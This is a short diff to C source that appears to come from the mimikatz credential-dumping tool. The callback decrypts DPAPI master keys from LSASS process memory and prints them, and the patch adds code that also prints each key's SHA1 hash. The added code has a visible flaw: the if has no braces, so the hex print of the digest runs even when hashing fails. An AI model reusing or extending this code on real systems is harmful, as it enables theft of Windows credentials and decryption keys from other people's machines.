@@ -48,6 +48,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hLocalMemory}, aKey = {NULL, &hLocalMemory}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	PKUHL_M_SEKURLSA_PACKAGE pPackage = (pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
+	BYTE dgst[SHA_DIGEST_LENGTH];
 	DWORD monNb = 0;
 
 	if(pData->LogonType != Network)
@@ -76,6 +77,8 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
 									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
+									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
+										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
 								}
 								LocalFree(aKey.address);
 							}
